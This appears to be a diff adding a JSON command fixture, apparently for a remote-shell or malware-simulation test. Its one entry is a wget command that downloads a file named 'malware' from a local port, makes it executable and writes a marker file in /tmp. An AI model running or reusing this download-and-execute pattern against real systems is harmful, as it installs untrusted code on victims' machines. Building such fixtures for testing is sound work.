@@ -1,0 +1,5 @@
+[
+	{
+		"TYPE" : "REMOTE", "CMD_TYPE" : "CMD", "CMD" : "wget -O malware 127.0.0.1:12000/download > /dev/null 2>&1 && chmod 755 malware && echo DOWNLOADED > /tmp/AAABBB\n", "RECV" : "shell"
+	}
+]
